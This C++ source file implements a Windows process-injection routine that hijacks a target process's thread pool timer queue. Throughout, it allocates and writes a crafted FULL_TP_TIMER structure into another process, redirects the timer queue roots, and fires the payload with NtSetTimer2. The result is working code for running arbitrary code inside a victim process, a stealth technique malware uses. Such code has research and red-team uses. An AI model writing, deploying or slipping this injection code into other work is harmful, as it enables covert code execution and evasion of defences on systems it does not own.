#include "../include/Injection.hpp"

bool InjectViaTpTimer(_In_ HANDLE hWorkerFactory, _In_ HANDLE hTimer, _In_ void* payloadAddress, _In_ HANDLE targetProcess)
{
    fnNtQueryInformationWorkerFactory pQueryWorkerFactory  = nullptr;
    long long timeOutInterval                              = -10000000;
    PFULL_TP_TIMER remoteTpTimer                           = nullptr;
    PFULL_TP_TIMER pFullTpTimer                            = nullptr;
    LARGE_INTEGER dueTime                                  = { 0 };
    WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo     = { 0 };
    fnNtSetTimer2 pNtSetTimer2                             = nullptr;
    NTSTATUS status                                        = ERROR_SUCCESS;

    pNtSetTimer2 = reinterpret_cast<fnNtSetTimer2>(
        GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"),"NtSetTimer2"));

    pQueryWorkerFactory = reinterpret_cast<fnNtQueryInformationWorkerFactory>(
        GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryInformationWorkerFactory"));

    if (pQueryWorkerFactory == nullptr || pNtSetTimer2 == nullptr) {
        std::cerr << "{!!} Failed to get NtQueryInformationWorkerFactory function pointer." << std::endl;
        return false;
    }

    //
    // Get worker factory basic information
    //
    status = pQueryWorkerFactory(
        hWorkerFactory,
        WorkerFactoryBasicInformation,
        &workerFactoryInfo,
        sizeof(WORKER_FACTORY_BASIC_INFORMATION),
        nullptr
    );

    if (status != ERROR_SUCCESS) {
        NTAPI_ERR(NtQueryInformationWorkerFactory, status);
        return false;
    }

    //
    // Create callback structure associated with our payload
    //
    pFullTpTimer = reinterpret_cast<PFULL_TP_TIMER>(
        CreateThreadpoolTimer(
            static_cast<PTP_TIMER_CALLBACK>(payloadAddress),
            nullptr,
            nullptr));

    if (pFullTpTimer == nullptr) {
        WIN32_ERR(CreateThreadPoolTimer);
        return false;
    }

    //
    // Allocate memory for FULL_TP_TIMER structure
    //
    remoteTpTimer = static_cast<PFULL_TP_TIMER>(VirtualAllocEx(
        targetProcess,
        nullptr,
        sizeof(FULL_TP_TIMER),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    ));

    if (remoteTpTimer == nullptr) {
        WIN32_ERR(VirtualAllocEx);
        return false;
    }

    //
    // Modify some important members, and then write the structure
    //
    pFullTpTimer->Work.CleanupGroupMember.Pool = static_cast<PFULL_TP_POOL>(workerFactoryInfo.StartParameter);
    pFullTpTimer->DueTime = timeOutInterval;

    pFullTpTimer->WindowEndLinks.Key = timeOutInterval;
    pFullTpTimer->WindowStartLinks.Key = timeOutInterval;

    pFullTpTimer->WindowStartLinks.Children.Flink = &remoteTpTimer->WindowStartLinks.Children;
    pFullTpTimer->WindowStartLinks.Children.Blink = &remoteTpTimer->WindowStartLinks.Children;

    pFullTpTimer->WindowEndLinks.Children.Flink = &remoteTpTimer->WindowEndLinks.Children;
    pFullTpTimer->WindowEndLinks.Children.Blink = &remoteTpTimer->WindowEndLinks.Children;

    if (!WriteProcessMemory(
         targetProcess,
         remoteTpTimer,
         pFullTpTimer,
         sizeof(FULL_TP_TIMER),
         nullptr
    )) {
        WIN32_ERR(WriteProcessMemory(First Call));
        return false;
    }

    //
    // Change WindowStart.Root and WindowEnd.Root to point to the TP_TIMER callback
    //
    auto pTpTimerWindowStartLinks = &remoteTpTimer->WindowStartLinks;
    if (!WriteProcessMemory(
         targetProcess,
         &pFullTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root,
         reinterpret_cast<PVOID>(&pTpTimerWindowStartLinks),
         sizeof(pTpTimerWindowStartLinks),
         nullptr
    )) {
        WIN32_ERR(WriteProcessMemory(Second Call));
        return false;
    }

    auto pTpTimerWindowEndLinks = &remoteTpTimer->WindowEndLinks;
    if (!WriteProcessMemory(
         targetProcess,
         &pFullTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root,
         reinterpret_cast<PVOID>(&pTpTimerWindowEndLinks),
         sizeof(pTpTimerWindowEndLinks),
         nullptr
    )) {
        WIN32_ERR(WriteProcessMemory(Third Call));
        return false;
    }

    //
    // Trigger the callback
    //
    dueTime.QuadPart = timeOutInterval;
    T2_SET_PARAMETERS timerParameters = { 0 };

    status = pNtSetTimer2(
        hTimer,
        &dueTime,
        NULL,
        &timerParameters
    );

    if(status != ERROR_SUCCESS) {
        NTAPI_ERR(NtSetTimer2, status);
        return false;
    }

    return true;
}
